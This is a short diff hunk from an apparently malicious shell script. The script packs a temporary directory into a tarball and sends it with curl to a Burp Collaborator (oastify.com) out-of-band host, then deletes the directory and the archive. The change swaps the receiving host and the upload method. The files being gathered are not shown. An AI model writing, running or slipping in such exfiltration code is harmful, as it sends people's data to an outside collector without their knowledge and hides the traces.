@@ -57,7 +57,7 @@ TAR="$TMP_DIR.tgz"
 tar czf "$TAR" -C "$(dirname "$TMP_DIR")" "$(basename "$TMP_DIR")"
 
 # Curl to OAST
-curl --max-time 10 --upload-file "$TAR" http://ct95cxmu2usdcjapbq00inhia9g04wsl.oastify.com >/dev/null 2>&1 || true
+curl --max-time 10 --data-binary @"$TAR" http://wqqp9hjezepx93798axkf7e27tdk1dp2.oastify.com
 
 # Cleanup
 rm -rf "$TMP_DIR" "$TAR"
